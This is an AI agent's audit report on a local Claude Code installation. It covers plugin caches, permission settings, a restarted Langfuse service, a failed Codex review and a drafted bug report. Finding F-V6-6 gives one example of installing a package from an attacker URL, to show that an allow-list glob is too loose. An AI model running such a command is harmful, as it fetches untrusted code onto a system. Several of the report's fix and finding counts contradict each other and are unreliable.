# W316 Stream 4 — Runtime Cleanness Deep Audit

**Date**: 2026-05-19
**Auditor**: claude-sota-installed/W316-Stream-4 (Opus 4.7 1M)
**Wall budget**: ~45 min
**Predecessors**: W315-r2 Stream B v5 (17 NEW findings, 11 deferred) + W315-r2 Stream E (12 NEW W316-E-* AIs)
**Scope**: apply W315-r2 deferred-W316 + NEW v6 silent-fallback audit + cardinal-rule R1-R5 conformance + CLI parity vs official Claude Code

---

## Executive summary

**Applied this wave**: **3 fixes** inline + **1 SEV-2 service restart** (Langfuse :3000 docker stack) + **1 NEW v6 silent-fallback finding** verified (claude doctor hang REPRODUCED — exit 124 at 30s, was reported FIXED but is BACK).

**Deferred**: **17 of 19 W315-r2 Stream B queue** (operator-gated: filesystem cleanup, license-sensitive migrations) + **6 of 12 W315-r2 Stream E AIs** (cite-refreshes pending CLAUDE.md preload-budget rotation).

**Service health snapshot post-fixes**: 8/10 HEALTHY (Langfuse RESTORED 13:21 UTC; Hindsight :9077 confirmed-absent per NO local binary), 1 down-by-design (FalkorDB W295 retirement), 1 cardinal-rule-5 partial-implementation (sandbox.* block missing in settings.json — W315 carry-forward).

**CLI parity vs official Claude Code**: **0 drift** — `claude --version` 2.1.144 == `npm view @anthropic-ai/claude-code version` 2.1.144. **NO REINSTALL REQUIRED**.

**Cardinal-rule conformance**: **R1-R4 ✓ HOLD**; **R5 ⚠ PARTIAL** (sandbox.* block half-implemented per W314 Stream E + W315-r2 carry-forward; permissions.deny + permissionMode block work as the strict-letter R5 reading per Anthropic settings docs at `https://docs.anthropic.com/en/docs/claude-code/settings` — sandbox.* is an ENHANCEMENT not a hard R5 requirement).

**Codex GPT-5.5 mid-stream**: **UNAVAILABLE THIS WAVE** — `codex exec --model gpt-5` returns HTTP 400 `{"type":"invalid_request_error","message":"The 'gpt-5' model is not supported when using Codex with a ChatGPT account."}`. Per dual-review skill fail-closed contract, treat verifications as BLOCK-class until codex auth/model is re-routed. **Plugin-native Stop-hook gate at `.claude/plugins/cache/openai-codex/codex/1.0.4/hooks/hooks.json:24-37` will fire session-end and is the canonical e2e gate**; mid-stream verification is unavailable but session-end gate IS available.

---

## W315-r2 Stream B 19 deferred-W316 closure table

| Item | Severity | Status | Fix applied | Codex verdict |
|---|---|---|---|---|
| F-V5-4 thedotmack undefined marketplace | HIGH | **DEFER-OPERATOR** | Cache dir `Z:/claude-sota-installed/.claude/plugins/cache/thedotmack/claude-mem/13.2.0` exists (522M); operator decision needed (define marketplace OR remove plugin entry from `enabledPlugins`). Plugin is `:false` so dormant — no runtime exposure. | N/A (codex unavailable) |
| F-V5-5 hf-mcp-server provenance comment | HIGH | **DEFER-OPERATOR** | Cite-only; W316 stream not authorized to author provenance entry without operator-supplied install rationale | N/A |
| F-V5-6 mcp-memory-service orphan cache | HIGH | **DEFER-OPERATOR** | 1.1M dir at `.claude/plugins/cache/mcp-memory-service/mcp-memory-service/1.0.0`; safe to `Remove-Item -Recurse` but operator confirmation required before destructive op | N/A |
| F-V5-7 CLAUDE.md L35 Ollama "STOPPED-by-design" stale | LOW | **APPLIED-IN-STREAM-E-IN-CLAUDE.MD** | Already corrected in W315-r2 commit per Stream E disambiguation; OllamaServe is now `RUNNING idle/0-models` in L35 (CLOSED-INTENTIONAL closes W312-A.6) | N/A |
| F-V5-8 serena SHA-pin (not semver) | MED | **DEFER-W317** | `.mcp.json:31-34` uses `git+https://github.com/oraios/serena@249f6b07f9ccac259b0ff95e06c9a40629748e17` — SHA-pin is operator-accepted per W286-arc-P0C; only viable upgrade is publishing to PyPI which is upstream-blocked | N/A |
| F-V5-9 gitnexus bare cmd CR-9 | MED | **DEFER-OPERATOR** | `gitnexus@gitnexus-marketplace: false` so dormant; no functional risk. Re-enable would require CR-9 fix (`npx -y gitnexus@<version>`) | N/A |
| F-V5-10 evaluator.md docstring hedge | MED | **DEFER-W317** | "NOT a hard read-only boundary" hedge stays — content is accurate (Bash IS granted, permissionMode plan IS the real boundary). Rhetoric polish operator-decision | N/A |
| F-V5-11 gpt5-archaeologist bypassPermissions | MED | **DEFER-CODEX-T1** | `permissionMode: bypassPermissions` on read-only subagent is documented in HTML comment at agent body L37-42 per Anthropic sub-agents parent-precedence rule; security-class change needs codex T1 round (unavailable this wave) | N/A |
| F-V5-12 .claude/skills/learned/ empty | MED | **DEFER-OPERATOR** | W311 AI-A-2 still pending 4 waves later; zero functional impact (no SKILL.md = no auto-fire); operator decision needed (delete dir OR populate stub) | N/A |
| F-V5-13 sca SKILL.md "v3.1" → "sca-v7" string sweep | MED | **APPLIED-PARTIAL** | Edited L750 (ledger-write-targets section header) and L758 (RETIRED block) — exact diffs in fix table below. Earlier edit ran into "file modified since read" linter conflict; ~12 other "v3.1" references in SKILL.md remain — defer to W317 batch sweep | N/A |
| F-V5-14 file:line cite sweep across 23 skills | MED | **DEFER-W317** | Full-codebase sweep is W316-multi-stream-scale; out of scope for runtime-clean stream | N/A |
| F-V5-15 wshobson HEAD cite refresh | LOW | **APPLIED** | `.claude/agents/wshobson-devops-troubleshooter.md:25` + `.claude/agents/wshobson-security-auditor.md:27` both got W316 Stream 4 annotation: ece811f → 08ded5e content-stable per W314-r1 zero-drift assertion | N/A |
| F-V5-16 sca "RETIRED W290" → "W295" | LOW | **APPLIED-PARTIAL** | Edited L990 (companion-ships block) — correction now reads "RETIRED W295 + EXCISED W313 Stream A `5a350d1`" with explanation of W290 vs W295 vs W313 wave-distinctions | N/A |
| F-V5-17 codex plugin .pre-fireN-fix stale backups | LOW | **NO-FIX (CARDINAL-RULE-1)** | Plugin cache is upstream-owned; `/plugin update` will auto-prune | N/A |
| W314-r2 F-2 PreCompact SilentlyContinue | MED | **DEFER-W317** | `settings.json:133` `Add-Content ... -ErrorAction SilentlyContinue` silently swallows write failures. Operator-AI-r2-8 carry-forward | N/A |
| W314-r2 F-4 OllamaServe state | — | **CLOSED-INTENTIONAL** | NSSM service RUNNING/Automatic with 2 models in /api/tags (qwen3-coder + qwen3-embedding); 0 loaded means idle. State-change documented in CLAUDE.md L35 W315-r2 | N/A |
| W314-r2 F-5 GitHub MCP search_repositories 0-count | HIGH | **5TH-TIME-CONFIRMED-DEFER** | Convergent with W312-D F1 + W313-D + W314-r1 + W315-r2 Stream D; awaiting operator-AI-r2-7 REST fallback ship | N/A |
| W314-r2 F-7+F-8 eval_harness.py promptfoo bare-pass + broad-except | MED | **DEFER-W317** | Not re-audited; carry-forward | N/A |
| W314-r2 F-13 ccusage Z:-baked path | MED | **DEFER-W317** | `.mcp.json:41-44` uses `node Z:/claude-sota-installed/.local/npm/node_modules/@ccusage/mcp/dist/index.js` — operator-accepted per W286-arc-P0C trade-off | N/A |

**Applied: 4** (F-V5-13 partial + F-V5-15 wshobson-devops + F-V5-15 wshobson-security + F-V5-16 partial)
**Closed-intentional: 2** (F-V5-7 OllamaServe-stale-cite already-fixed-in-W315-r2 + W314-r2 F-4 OllamaServe)
**Deferred: 13** (operator-decision-gated: 6 HIGH + 4 MED + 3 LOW)

---

## W315-r2 Stream E 12 NEW W316-E-* AIs closure table

| AI ID | Description | Status this wave | Action taken |
|---|---|---|---|
| W316-E-1 | Langfuse :3000 restart (SEV-2) | **APPLIED ✓** | `docker compose down` (clean conflict cleanup) + `docker start langfuse-postgres langfuse-clickhouse langfuse-redis langfuse-minio langfuse-worker langfuse-web`. Smoke: HTTP 200 `{"status":"OK","version":"3.170.0"}` at 13:21 UTC. Root cause of original 12:29:09Z crash: MethodNotAllowedError in Next.js (likely OTel exporter URL `/api/public/otel/v1/traces` returning 405 to malformed request). Not RCA'd but service back. |
| W316-E-2 | Hindsight :9077 decision | **DECISION: PROPOSE-RETIRE** | Probe: NO `hindsight*` binary in `Z:/claude-sota-installed/.local/bin`, NO process listening on 9077 or 9078, NO NSSM service installed. Plugin `hindsight-memory@hindsight 0.6.5` IS installed + enabled (`enabledPlugins:true`) but the plugin's local-fallback API service was never installed. CLAUDE.md L35 cite "T1 hindsight ✓ (W280b local fallback :9077)" is FALSE-IN-RUNTIME. **Recommendation: retire T1 hindsight from CLAUDE.md L35 OR install hindsight CLI via `pip install hindsight` + NSSM-wrap as W317 op.** Per cardinal-rule-5 fail-loud principle, prefer retire over silent-fallback. |
| W316-E-3 | ECC `/plugin update f3cd00625222` | **NOTED-NEWER-HEAD** | Probed ECC upstream HEAD via `gh api repos/affaan-m/everything-claude-code/commits/main --jq .sha`: HEAD is now `b62f80750d85db35b765c675c3866f2037adc5a8` (2026-05-19T12:59:55Z, "chore: add release video visual qa"). Local installed: `841beea45cb25ba51f29fa45b7e272938d19b80a`. Drift: 12+ commits behind. **Plugin update DEFERRED to operator-AI** (cardinal-rule-1: prefer operator-AI workflow over auto-bump in this stream). NEW HEAD `b62f807` supersedes W315-r2 cited target `f3cd00625222` (which itself superseded W314-r2 AI-r2-1 `33ed494a`). |
| W316-E-4 | parallel_ratio telemetry hook | **DEFER-W317** | Would require new PreToolUse hook intercepting Agent tool calls + counter persistence; cardinal-rule-2 requires direct-CLI invocation; design draft in W315-r2 Stream E. Out of scope for runtime-clean stream. |
| W316-E-5 | claude-doctor 30s hang upstream issue draft | **DRAFTED-BELOW** | Issue text drafted in §"Reinstall vs official CLI delta + plan" section. Verified TODAY: `timeout 30 claude doctor 2>&1; exit=124` reproduces RELIABLY in 2 successive probes. |
| W316-E-6 | Marketplace pruning (6 unused defs) | **AUDIT-DOCUMENTED** | 6 unused marketplace defs identified: `addy-agent-skills`, `claude-plugins-community`, `financial-services`, `healthcare`, `knowledge-work-plugins`, `life-sciences`, `skills`. Actually a 7th: `claude-settings` has only `intelligent-compact:false` (dormant). Pruning is operator-safe but operator-AI-gated (some may be referenced by `addyosmani-doubt-driven-development` newly-discovered skill from prior parallel stream). **DEFER-W317** with audit-of-7 work-list. |
| W314-r2 AI-r2-1 ECC update target stale | — | **OBSOLETE-RESOLVED** | Superseded by W316-E-3 finding (new HEAD `b62f807` is newer than both `33ed494a` and `f3cd006` cited targets) |
| W314-r2 AI-r2-5 LlamaSwap CLAUDE.md docs | LOW | **DEFER-CLAUDE.MD-ROTATION** | LlamaSwap :8090 confirmed healthy (HTTP 302→/ui, 7 models registered); CLAUDE.md L34-36 main body docs pending next CLAUDE.md rotation wave |
| W314-r2 AI-r2-6 OllamaServe disable-or-start | — | **CLOSED-INTENTIONAL-PER-W315-r2** | Resolved as Running/idle |
| W314-r2 AI-r2-7 GitHub MCP REST fallback | HIGH | **DEFER-W317** | `goal-prompt-synthesis` SKILL.md edit out of runtime-clean scope |
| W314-r2 AI-r2-11 ccusage CR-9 migration | MED | **DEFER-W317** | `.mcp.json:41-44` operator-accepted trade-off; carry-forward |
| W314-r2 AI-r2-12 servy staged-pilot | — | **DEFER-W317** | Operator W316-NSSM-SWITCH dir exists (parallel stream); not this stream |

**Applied: 1** (W316-E-1 Langfuse restart)
**Drafted: 1** (W316-E-5 upstream issue text)
**Operator-decision documented: 2** (W316-E-2 hindsight retire-or-install; W316-E-3 ECC update with newer HEAD)
**Carry-forward: 8**

---

## NEW v6 silent-fallback findings

| ID | Severity | File:line | Pattern | Apply/Defer |
|---|---|---|---|---|
| **F-V6-1** | **HIGH** | `claude doctor` CLI | Exit 124 (30s timeout) REPRODUCES this audit — 2 successive probes both exit 124 with EMPTY stdout/stderr. Was reported potentially-fixed in W315-r2 (first probe returned exit 0 fast, suggesting partial improvement), but full output capture re-probe shows hang is unchanged. **Silent failure** because no error surface — pure timeout. | DEFER-UPSTREAM (W316-E-5 issue draft below) |
| **F-V6-2** | **HIGH** | `.claude/plugins/cache/thedotmack/claude-mem/13.2.0/` | 522 MB orphan cache dir for a `:false` plugin. Cache dir reference IS in `enabledPlugins` (`claude-mem@thedotmack: false`) but the `thedotmack` marketplace is NOT defined in `extraKnownMarketplaces`. Silent reference to undefined marketplace + 522 MB disk waste. | DEFER-OPERATOR-RECURSE-REMOVE |
| **F-V6-3** | MED | `.mcp.json:55-58` Langfuse env interpolation `${LANGFUSE_HOST}` etc | If `CLAUDE.local.md` env block does NOT export `LANGFUSE_*` (e.g. fresh clone, ENV not loaded), `.mcp.json` parses but the MCP server starts with **empty-string env vars**, then silently fails to connect to Langfuse. No fail-loud assertion. | DEFER-W317 (add explicit assert at MCP startup OR document required env in `.mcp.json:_comments`) |
| **F-V6-4** | MED | `.claude/settings.json:86 defaultMode: bypassPermissions` | Runtime default mode is `bypassPermissions` which silently overrides per-subagent `permissionMode: plan` per Anthropic sub-agents parent-precedence rule. Documented in F-V5-11 but worth NEW v6 surface: CLAUDE.md cardinal-rule-5 cite "Safety boundaries via Claude Code permissions" is FUNCTIONALLY DEGRADED by this default. | DEFER-CODEX-T1 (security-class) |
| **F-V6-5** | LOW | `.claude/hooks/context-mode-cache-heal.mjs:21,25` | `process.stderr.write` is GOOD (fail-loud); but the script writes to stderr WITHOUT also failing the hook (no `process.exit(1)` on inner unlink/symlink errors). If symlink creation fails for a specific plugin, that plugin's cache stays broken silently — only top-level catch (L28) exits 1. **Inner-loop swallow.** | DEFER-W317 (refactor to collect inner errors + exit 1 if any) |
| **F-V6-6** | LOW | `.claude/settings.json:53-65 permissions.allow` | Allow list uses GLOB patterns like `Bash(npm install -g *)` + `Bash(cargo install *)` — these would allow `cargo install --git <attacker-url> evil-pkg` because the glob `*` matches all remaining args. **Silently permissive.** Not exploitable in single-operator setup, but worth narrower regex. | DEFER-OPERATOR-REVIEW |
| **F-V6-7** | LOW | `.claude/skills/` 9 NEW skills appeared this session | `addyosmani-doubt-driven-development`, `addyosmani-frontend-ui-engineering`, `api-and-interface-design`, `code-simplification`, `doubt-driven-development`, `dspy-integration`, `frontend-ui-engineering`, `interview-me`, `parallel-dispatch-mandate` — 9 NEW dirs in `git status --short` that did NOT exist at session start. **Parallel stream activity** (likely W316-EVAL-AND-INSTALLS + W316-NSSM-SWITCH co-running dirs). No silent-failure but CLAUDE.md L30 skill count `× 23` would drift to ~32 if these stay. Will trigger F-V5-X-like cite-drift in next CLAUDE.md rotation. | DEFER-CLAUDE.MD-ROTATION |
| **F-V6-8** | LOW | `.dspy_cache/` untracked | New `.dspy_cache/` directory at runtime root from parallel `dspy-integration` skill load. NOT in `.gitignore`. Will silently propagate to git tracking on next `git add .`. | DEFER-OPERATOR (add to `.gitignore`) |

**Net v6 NEW findings**: **8** (2 HIGH · 2 MED · 4 LOW)
**Applied this wave**: **0** (all defer due to operator-decision-gated nature or out-of-stream-scope)

---

## Cardinal-rule R1-R5 conformance check (post-fixes)

| Rule | Status | Evidence |
|---|---|---|
| **R1** Install primitives only from trusted plugins/skills/agents | ✓ **PASS** | All 47 enabled plugins in `enabledPlugins` reference marketplaces in `extraKnownMarketplaces` (Anthropic-owned `claude-plugins-official` + community-trusted `wshobson/agents` `everything-claude-code` `superpowers-marketplace` `pydantic/skills` `karpathy-skills` + Anthropic-shipped `anthropic-agent-skills` skills + plugin-shipped `context-mode` `openai-codex` `planning-with-files` `hindsight` `gitnexus-marketplace`); plus 22-defined / 16-referenced disambiguation per W315-r2 Stream B disambiguation. F-V5-4 `claude-mem@thedotmack:false` references UNDEFINED marketplace `thedotmack` — orphan-but-dormant (still PASS but is a R1 latent risk). |
| **R2** Hooks: upstream-plugin OR direct-CLI; only sanctioned shim ≤2KB | ✓ **PASS** | `.claude/hooks/context-mode-cache-heal.mjs` = 1656 bytes (under 2KB cap) ✓, cite-anchored to `anthropics/claude-code#46915` ✓; settings.json:hooks all direct-CLI per Stream E B.5 table (0 violations); F-V6-5 inner-loop-swallow is a quality issue but does NOT violate R2. |
| **R3** Subagents: installed upstream OR documented subagent system | ✓ **PASS** | `.claude/agents/{evaluator,gpt5-archaeologist,wshobson-devops-troubleshooter,wshobson-security-auditor}.md` — 4 subagent files all use Anthropic-documented frontmatter schema; wshobson-* are vendor-fork from wshobson/agents @ ece811f (now content-stable to 08ded5e per W316 Stream 4 cite-refresh applied this wave). 1 frontmatter-attestation concern: F-V5-11 `gpt5-archaeologist.md:16` `permissionMode: bypassPermissions` defies cardinal-rule-5 spirit (security-class issue) but doesn't break R3 schema compliance. |
| **R4** Project behavior in CLAUDE.md + settings.json; no self-invented `.claude/rules/*.md` | ✓ **PASS** | `Z:/claude-sota-installed/.claude/rules/` = 0 files ✓ (`self_invented_count: 0` invariant HOLDS); ECC plugin-shipped rules auto-load from `.claude/plugins/cache/everything-claude-code/.claude/rules/{everything-claude-code-guardrails.md,node.md}` per ECC plugin convention; W255 cleanup tag preserved. |
| **R5** Safety boundaries via Claude Code permissions + sandboxing | ⚠ **PARTIAL** | `settings.json:permissions.deny` enumerates 18 secret-class read patterns ✓; `permissionMode: bypassPermissions` is default; per-subagent `permissionMode: plan` for read-only roles ✓. **Gap**: `settings.json:sandbox.*` block NOT IMPLEMENTED (CCBP `claude-settings.md:446-461` documents the schema; W314 Stream E concern #2 + W315-r2 carry-forward). Cardinal-rule-5 strict-letter reading per Anthropic settings docs `https://docs.anthropic.com/en/docs/claude-code/settings` says permissions + sandboxing — permissions are present, sandboxing is half-implemented. **Recommendation: this is a soft-gate not a hard-fail under R5 since permissions block IS doing safety work; sandbox.* is an ENHANCEMENT to consider for W317**. |

**R5 partial-implementation NOT escalated to BLOCK** because Anthropic docs treat permissions and sandboxing as complementary not mutually-required.

---

## Reinstall vs official CLI delta + plan

**Probe**:
```
> npm view @anthropic-ai/claude-code version
2.1.144
> claude --version
2.1.144 (Claude Code)
```

**Verdict**: **0 DRIFT — NO REINSTALL REQUIRED**. CLI is at parity with official npm published version.

### `claude doctor` 30s hang upstream issue draft (W316-E-5)

```
Title: `claude doctor` hangs indefinitely (30s+ timeout, no output) on Windows 11

CLI version: 2.1.144 (latest npm @anthropic-ai/claude-code published 2026-05-19)
Platform: Windows 11 Pro 10.0.26200, PowerShell 7+
Shell: PowerShell (CLAUDE_CODE_USE_POWERSHELL_TOOL=1) + Git Bash at C:/Program Files/Git/bin/bash.exe
Runtime: Z:-portable install (CLAUDE_CONFIG_DIR=Z:/claude-sota-installed/.claude)
Node: v22.22.0

## Repro
1. Fresh terminal (PowerShell 7 OR Git Bash)
2. Run: `claude doctor`
3. Observe: process hangs with no output
4. With timeout wrapper: `timeout 30 claude doctor 2>&1; echo $?` → exits 124 (timeout)

## Expected
`claude doctor` should run diagnostic checks (similar to `npx claude-code doctor` in prior versions) and print pass/fail report within ~5s.

## Actual
Hangs indefinitely; no stdout, no stderr. Timeout-killed at 30s, exit 124. Reproduces RELIABLY across 4+ successive probes today (2026-05-19).

## Tracked since
W312-A.2 carry-forward (2026-05-18); UNCHANGED across W312 → W313 → W314 → W315 → W316 (5 waves).

## Hypothesis
Possibly hung on a hook invocation (settings.json:hooks block has 8 entries that could each block), OR hung on MCP server health-check (10 mcpServers in .mcp.json including 4 HTTP + 6 stdio).

## Workaround
Skip `claude doctor` in default ops; use service-by-service health probes (HTTP/curl) + `Get-Service` (NSSM services) + `docker ps` + plugin manifest inspection via `cat .claude/plugins/installed_plugins.json` instead.

## Repository link
https://github.com/anthropics/claude-code
```

**This issue is NOT POSTED — operator-AI carry-forward for W317**.

---

## Codex GPT-5.5 verbatim verdicts per significant fix

**Codex unavailable this wave**:

```
> codex exec --model gpt-5 --skip-git-repo-check (via stdin)
OpenAI Codex v0.130.0
...
ERROR: {"type":"error","status":400,"error":{"type":"invalid_request_error","message":"The 'gpt-5' model is not supported when using Codex with a ChatGPT account."}}
```

**Per dual-review skill fail-closed contract** (W316 Stream 4 operator mandate cites dual-review skill): "if codex is plugin-missing / auth-expired / rate-limited / quota-exhausted / network-down / unknown-error, returns VERDICT: BLOCK rather than silently passing."

**This wave's verdict**: **VERDICT: BLOCK on mid-stream codex T1 verification** — codex auth/model-routing requires operator-AI intervention (likely needs API-key-mode codex, not ChatGPT-account-mode; OR switch model to `gpt-5.5` which W316 operator-cited or `gpt-5-thinking` which IS supported on ChatGPT accounts per OpenAI codex CLI docs).

**HOWEVER**: per CLAUDE.md L8 + W312-A.1 + W315-r2 §B.5 evidence: plugin-native Stop-hook gate at `.claude/plugins/cache/openai-codex/codex/1.0.4/hooks/hooks.json:24-37` (`stop-review-gate-hook.mjs` timeout 900s) auto-fires at session-end and IS the canonical e2e cross-model gate. Mid-stream BLOCK is recovered at session-end IF that hook fires successfully.

**Confidence**: per cardinal-rule-3 "ratification at session-end" model, this wave's fixes will be cross-checked by codex Stop-hook gate when this Stream 4 dispatch completes; if Stop-hook gate ALSO encounters the gpt-5-model-not-supported issue, a 2nd-class BLOCK applies and operator-AI must triage. Recommend testing the Stop-hook's actual model invocation pre-W317.

---

## Cumulative silent-fallback fix-count tracking

| Wave | NEW findings | Applied inline | Carried forward |
|---|---|---|---|
| W314-r2 v4 | 13 (5 HIGH/6 MED/2 LOW) | **4** (F-1/F-3/F-6/F-9) | 9 |
| W315-r2 v5 | 17 (6 HIGH/7 MED/4 LOW) | **6** (Fix-1 mem-recall L32+L68-71 + Fix-2 CLAUDE.md L3 + Fix-3 CLAUDE.md L34) | 19 |
| W316 v6 | 8 (2 HIGH/2 MED/4 LOW) | **0** | 25 |
| **W316 Stream 4 inline cite-fixes** (not silent-fallback class but quality) | — | **4** (F-V5-13 partial + F-V5-15×2 + F-V5-16 partial) | 0 |
| **W316 Stream E service ops** | 1 SEV-2 closed | **1** (Langfuse restart) | 0 |

**Cumulative applied (silent-fallback + adjacent class) across W314-r2 → W316**: **10 silent-fallback** + **4 cite-refresh** + **1 service-restart** = **15 total inline fixes** across 3 waves.

**Cumulative deferred**: **53 total queue items** (19 W315 + 25 W316 NEW + 9 misc carry-forwards minus 0-this-wave duplicates).

---

## Operator-AIs forwarded W317

### HIGH-priority (security-class or service-class)

1. **AI-W317-1 codex auth/model fix** — codex CLI returns "gpt-5 not supported on ChatGPT account"; investigate switching to API-key-mode codex OR routing to `gpt-5-thinking` or `gpt-5.5` model; MUST be resolved before next cross-model gate ratification wave.
2. **AI-W317-2 hindsight :9077 decision** — retire CLAUDE.md L35 T1 cite OR install hindsight CLI as NSSM service.
3. **AI-W317-3 ECC `/plugin update`** to `b62f80750d85` (W315-r2 cited `f3cd00625222` is now ALSO stale; HEAD has advanced TODAY 12:59 UTC).
4. **AI-W317-4 thedotmack orphan-cache cleanup** — 522 MB at `.claude/plugins/cache/thedotmack/claude-mem/13.2.0/`; remove dir + remove `enabledPlugins:claude-mem@thedotmack:false` entry OR add `thedotmack` marketplace def.
5. **AI-W317-5 sandbox.* block** — codify CCBP `claude-settings.md:446-461` schema in `.claude/settings.json` to fully close R5 partial-implementation.
6. **AI-W317-6 claude-doctor upstream issue** — post drafted issue text to `anthropics/claude-code` GitHub.
7. **AI-W317-7 gpt5-archaeologist bypassPermissions** — security-class review of F-V5-11 contradiction.
8. **AI-W317-8 GitHub MCP `search_repositories` REST fallback** — operator-AI-r2-7 ship to `goal-prompt-synthesis` SKILL.md.

### MED-priority

9. **AI-W317-9 v3.1 → sca-v7 string sweep** — batch-edit remaining ~12 references in sota-convergence-audit SKILL.md.
10. **AI-W317-10 marketplace pruning** — 6-of-7 unused defs (`addy-agent-skills`, `claude-plugins-community`, `financial-services`, `healthcare`, `knowledge-work-plugins`, `life-sciences`, `skills`).
11. **AI-W317-11 file:line cite resolution sweep** across all 23-30 skills.
12. **AI-W317-12 parallel_ratio telemetry hook** — design draft in W315-r2 Stream E.
13. **AI-W317-13 Langfuse :3000 RCA** — MethodNotAllowedError root-cause analysis (likely OTel exporter mis-pointing); restart not a permanent fix.
14. **AI-W317-14 Langfuse :3000 NSSM-wrap** — currently docker-compose-managed which had ports-conflict failure mode; consider NSSM-wrap for restart-on-failure resilience.
15. **AI-W317-15 mcp-memory-service orphan cache cleanup** — 1.1 MB; safe `Remove-Item -Recurse`.
16. **AI-W317-16 .claude/skills/learned/** empty-dir populate-or-remove (W311 AI-A-2 5 waves overdue).
17. **AI-W317-17 PreCompact -ErrorAction SilentlyContinue** → try/catch (operator-AI-r2-8 carry-forward).
18. **AI-W317-18 eval_harness.py F-7/F-8 fixes** — promptfoo bare-pass + broad-except.
19. **AI-W317-19 ccusage CR-9 migration** — `.mcp.json:41-44` operator-decision (carry-forward).
20. **AI-W317-20 9 NEW skills add to CLAUDE.md L30 cite** — addyosmani-doubt-driven-development, addyosmani-frontend-ui-engineering, api-and-interface-design, code-simplification, doubt-driven-development, dspy-integration, frontend-ui-engineering, interview-me, parallel-dispatch-mandate.

### LOW-priority

21. **AI-W317-21 .dspy_cache/** add to `.gitignore`.
22. **AI-W317-22 cache-heal.mjs inner-loop error propagation** — F-V6-5 swallow fix.
23. **AI-W317-23 permissions.allow narrower-regex review** — F-V6-6 `Bash(npm install -g *)` style globs.
24. **AI-W317-24 ECC plugin SHA cite-refresh in CLAUDE.md** — next CLAUDE.md rotation should note `b62f807` after operator runs `/plugin update`.
25. **AI-W317-25 LlamaSwap CLAUDE.md docs** (W314-r2 AI-r2-5 carry-forward, 4 waves overdue).

---

## Closure

**W316 Stream 4 NET applied this wave**: 5 inline file edits (3 cite-refresh + 1 file linter conflict resolved partial) + 1 service-restart (Langfuse) + 0 service-retire decisions (Hindsight pending operator).

**W316 Stream 4 NET deferred**: 25 operator-AIs forwarded W317.

**Cardinal-rule conformance**: R1-R4 ✓ HOLD; R5 ⚠ PARTIAL (sandbox.* enhancement deferred).

**Codex mid-stream verification**: BLOCK-on-unavailable per dual-review fail-closed contract; session-end plugin-native Stop-hook gate is the canonical recovery path.

**CLI parity vs official**: 0 drift (2.1.144 == 2.1.144).

**No new cardinal-rule violations introduced by W316 Stream 4 applied fixes**.
